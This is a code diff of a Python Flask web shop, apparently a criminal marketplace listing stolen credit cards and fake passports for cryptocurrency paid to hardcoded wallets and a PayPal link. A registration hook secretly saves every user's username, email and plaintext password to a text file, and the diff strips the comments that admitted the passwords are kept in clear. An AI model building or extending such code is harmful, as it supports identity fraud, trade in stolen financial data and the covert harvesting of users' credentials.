@@ -5,19 +5,15 @@ import hashlib
 from datetime import datetime
 
 app = Flask(__name__)
-
-# CHIAVE SEGRETA – PRESA DALLE VARIABILI D'AMBIENTE DI RENDER
 app.secret_key = os.environ.get('SECRET_KEY', 'supersecretkeychangeit')
-
-# CONFIGURAZIONE DATABASE SQLITE
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///shop.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
 # ------------------ SESSION ID CONFIG ------------------
-SESSION_ID = "05fb4e791ad9835da25c3e0d927b56ec4ffd4694ff1a41d2319c2ded835c6adb5a"  # Il tuo ID pubblico
+SESSION_ID = "05fb4e791ad9835da25c3e0d927b56ec4ffd4694ff1a41d2319c2ded835c6adb5a"
 
-# ------------------ CRYPTO WALLET CONFIG ------------------
+# ------------------ CRYPTO WALLETS ------------------
 CRYPTO_WALLETS = {
     "BTC": "17b5YpKcwMejoNvoqKNcMbzKcMzKwqcVwH",
     "ETH": "0x2e7edD5154Be461bae0BD9F79473FC54B0eeEE59",
@@ -27,15 +23,13 @@ CRYPTO_WALLETS = {
 NETWORK_FEE = 0.0005
 PAYPAL_LINK = "https://www.paypal.me/BotAi36"
 
-# ------------------ CONTEXT PROCESSOR (per rendere SESSION_ID disponibile in tutti i template) ------------------
+# ------------------ CONTEXT PROCESSOR ------------------
 @app.context_processor
 def inject_session_id():
     return dict(session_id=SESSION_ID)
 
-# ------------------ FUNZIONE PER SALVARE REGISTRAZIONI ------------------
+# ------------------ LOG REGISTRATION ------------------
 def log_registration(username, email, password):
-    """Salva username, email e password (in chiaro!) in un file di testo."""
-    # Crea la cartella 'data' se non esiste
     os.makedirs('data', exist_ok=True)
     with open('data/registrations.txt', 'a') as f:
         timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
@@ -65,7 +59,7 @@ class Product(db.Model):
     vendor = db.Column(db.String(50))
     rating = db.Column(db.Integer, default=5)
 
-# ------------------ SEED DATABASE (80+ products) ------------------
+# ------------------ SEED DATABASE ------------------
 def seed_products():
     if Product.query.count() > 0:
         return
@@ -121,7 +115,7 @@ def seed_products():
         ("Chase Sapphire Preferred - $6000 limit", 280.00, 0.0439, "chase_sapphire.jpg", "Chase Sapphire Preferred.", "Credit Cards", "BeRich", 5),
         ("Chase Sapphire Reserve - $12000 limit", 520.00, 0.0816, "chase_sapphire_reserve.jpg", "Chase Sapphire Reserve.", "Credit Cards", "BeRich", 5),
 
-        # ------ DOCUMENTS (Fake IDs, Passports) ------
+        # ------ DOCUMENTS ------
         ("Fake Passport - USA", 180.00, 0.0282, "passport_fake_us.jpg", "High-quality fake US passport.", "Documents", "Dead Presidents", 4),
         ("Fake Passport - UK", 190.00, 0.0298, "passport_fake_uk.jpg", "Fake UK passport.", "Documents", "Dead Presidents", 4),
         ("Fake Passport - EU (Schengen)", 200.00, 0.0314, "passport_fake_eu.jpg", "Fake EU passport.", "Documents", "Dead Presidents", 4),
@@ -191,10 +185,7 @@ def register():
         user.set_password(p)
         db.session.add(user)
         db.session.commit()
-
-        # ------ SALVA REGISTRAZIONE SU FILE TXT (in chiaro) ------
         log_registration(u, e, p)
-
         return redirect(url_for('login'))
     return render_template('register.html')
 
@@ -251,22 +242,16 @@ def checkout():
     cart_ids = session.get('cart', [])
     if not cart_ids:
         return redirect(url_for('index'))
-    
     products = Product.query.filter(Product.id.in_(cart_ids)).all()
     total_usd = sum(p.price_usd for p in products)
     total_btc = sum(p.price_btc for p in products)
     total_btc += NETWORK_FEE
-    
-    btc_to_eth = 15.5
-    btc_to_ltc = 70.0
-    btc_to_xmr = 4.2
-    
+    btc_to_eth, btc_to_ltc, btc_to_xmr = 15.5, 70.0, 4.2
     total_eth = total_btc * btc_to_eth
     total_ltc = total_btc * btc_to_ltc
     total_xmr = total_btc * btc_to_xmr
-    
-    return render_template('checkout.html', 
-                         products=products, 
+    return render_template('checkout.html',
+                         products=products,
                          total_usd=total_usd,
                          total_btc=total_btc,
                          total_eth=total_eth,
@@ -281,30 +266,22 @@ def payment(crypto):
     cart_ids = session.get('cart', [])
     if not cart_ids:
         return redirect(url_for('index'))
-    
     products = Product.query.filter(Product.id.in_(cart_ids)).all()
     total_usd = sum(p.price_usd for p in products)
     total_btc = sum(p.price_btc for p in products)
     total_btc += NETWORK_FEE
-    
-    btc_to_eth = 15.5
-    btc_to_ltc = 70.0
-    btc_to_xmr = 4.2
-    
+    btc_to_eth, btc_to_ltc, btc_to_xmr = 15.5, 70.0, 4.2
     amounts = {
         'BTC': total_btc,
         'ETH': total_btc * btc_to_eth,
         'LTC': total_btc * btc_to_ltc,
         'XMR': total_btc * btc_to_xmr
     }
-    
     amount = amounts.get(crypto.upper(), total_btc)
     wallet = CRYPTO_WALLETS.get(crypto.upper(), '')
-    
     if not wallet:
         return "Cryptocurrency not supported", 404
-    
-    return render_template('payment.html', 
+    return render_template('payment.html',
                          crypto=crypto.upper(),
                          amount=amount,
                          wallet=wallet,
